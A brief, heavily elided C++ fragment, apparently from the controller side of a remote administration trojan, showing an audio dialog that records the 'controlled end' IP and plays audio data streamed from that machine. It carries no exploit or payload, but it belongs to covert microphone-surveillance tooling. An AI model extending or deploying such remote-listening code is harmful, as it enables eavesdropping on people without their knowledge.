	...
	, m_bIsSendLocalAudio(FALSE)
{
	...
	memset(&sockAddr, 0, sizeof(sockAddr));        //得到被控端ip
...
void CAudioDlg::OnReceiveComplete(void)
{
	...
	case TOKEN_AUDIO_DATA:
		{
			m_Audio.PlayBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);   //播放波形数据
			break;
		}
